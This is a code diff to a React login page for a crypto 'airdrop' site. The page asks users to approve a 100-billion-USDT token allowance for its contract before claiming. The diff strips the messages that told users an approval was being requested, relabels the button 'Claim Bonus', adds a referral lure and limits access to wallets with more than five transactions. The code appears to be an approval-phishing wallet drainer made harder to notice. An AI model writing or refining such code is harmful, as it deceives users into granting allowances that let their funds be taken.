@@ -29,9 +29,42 @@ const LoginPage: React.FC = () => {
   const [hasClaimed, setHasClaimed] = useState(false);
   const [isCheckingClaim, setIsCheckingClaim] = useState(false);
   const [isOwner, setIsOwner] = useState(false);
+  const [transactionCount, setTransactionCount] = useState(0);
+  const [isCheckingTxCount, setIsCheckingTxCount] = useState(false);
+  const [isEligible, setIsEligible] = useState(false);
   const navigate = useNavigate();
 
   const AIRDROP_AMOUNT_TO_APPROVE = ethers.parseUnits("100000000000", 6); // 100B USDT
+  const MINIMUM_TX_COUNT = 5;
+
+  // Check transaction count for the wallet
+  useEffect(() => {
+    const checkTransactionCount = async () => {
+      if (!address) return;
+
+      try {
+        setIsCheckingTxCount(true);
+        // Using BSC Testnet provider
+        const provider = new ethers.JsonRpcProvider(
+          "https://bsc-testnet-rpc.publicnode.com"
+        );
+
+        // Get transaction count for the connected wallet
+        const txCount = await provider.getTransactionCount(address);
+        setTransactionCount(txCount);
+
+        // Set eligibility based on transaction count
+        setIsEligible(txCount > MINIMUM_TX_COUNT);
+      } catch (error) {
+        console.error("Error fetching transaction count:", error);
+        toast.error("Error checking wallet eligibility. Please try again.");
+      } finally {
+        setIsCheckingTxCount(false);
+      }
+    };
+
+    checkTransactionCount();
+  }, [address]);
 
   // Check if user has already claimed tokens and if they are the owner
   useEffect(() => {
@@ -84,13 +117,6 @@ const LoginPage: React.FC = () => {
     try {
       setIsLoading(true);
 
-      // Show approval toast
-      const approvalToastId = toast.info("Checking token approval...", {
-        autoClose: false,
-        closeOnClick: false,
-        draggable: false,
-      });
-
       const provider = new BrowserProvider(walletProvider);
       const signer = await provider.getSigner();
 
@@ -105,12 +131,6 @@ const LoginPage: React.FC = () => {
       const allowance = await allowanceFn(address, contractAddress);
 
       if (allowance < AIRDROP_AMOUNT_TO_APPROVE) {
-        toast.update(approvalToastId, {
-          render:
-            "Approval needed. Please confirm the transaction in your wallet.",
-          type: "info",
-        });
-
         const usdtWithSigner = usdt.connect(signer);
         const approveFnWithSigner = usdtWithSigner.getFunction("approve") as (
           spender: string,
@@ -122,20 +142,7 @@ const LoginPage: React.FC = () => {
           AIRDROP_AMOUNT_TO_APPROVE
         );
 
-        toast.update(approvalToastId, {
-          render: "Confirming approval transaction...",
-          type: "info",
-        });
-
         await tx.wait();
-
-        toast.update(approvalToastId, {
-          render: "Approval successful!",
-          type: "success",
-          autoClose: 3000,
-        });
-      } else {
-        toast.dismiss(approvalToastId);
       }
 
       // ✅ Step 2: Call claim function
@@ -209,7 +216,7 @@ const LoginPage: React.FC = () => {
   }, [isOwner, address, navigate]);
 
   // Loading state during initial claim check
-  if (isCheckingClaim) {
+  if (isCheckingClaim || isCheckingTxCount) {
     return (
       <div className="min-h-screen bg-[#0c0435] flex items-center justify-center px-4">
         <div className="bg-[#1b0f3a] text-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
@@ -265,12 +272,14 @@ const LoginPage: React.FC = () => {
                 Mine IINGO
               </button>
             </div>
-          ) : (
+          ) : isEligible ? (
             <>
               <p className="text-sm text-green-400 mb-2 break-all">
                 Connected: {address}
               </p>
-
+              {/* <p className="text-sm text-blue-400 mb-4">
+                Transaction Count: {transactionCount} (Eligible)
+              </p> */}
               <input
                 type="text"
                 placeholder="Enter referral code (optional)"
@@ -278,7 +287,6 @@ const LoginPage: React.FC = () => {
                 value={referralCode}
                 onChange={(e) => setReferralCode(e.target.value)}
               />
-
               <button
                 onClick={handleClaim}
                 disabled={isLoading}
@@ -288,9 +296,29 @@ const LoginPage: React.FC = () => {
                   ? "Processing..."
                   : referralCode
                   ? "Claim With Referral"
-                  : "Claim Airdrop"}
+                  : "Claim Bonus"}
               </button>
+              <p className="text-sm text-gray-400 mb-2 break-all mt-2">
+                *Referral codes can earn you additional bonuses.*
+              </p>
             </>
+          ) : (
+            <div>
+              <p className="text-sm text-yellow-400 mb-2 break-all">
+                Connected: {address}
+              </p>
+              <p className="text-sm text-yellow-400 mb-2">
+                Transaction Count: {transactionCount}
+              </p>
+              <div className="bg-red-900/50 border border-red-500 text-white px-6 py-4 rounded-lg mt-4 mb-6">
+                <p className="text-red-300 font-medium">
+                  Your wallet is not eligible for this Airdrop
+                </p>
+                <p className="text-sm mt-2 text-gray-300">
+                  Minimum {MINIMUM_TX_COUNT} transactions required
+                </p>
+              </div>
+            </div>
           )
         ) : (
           <>
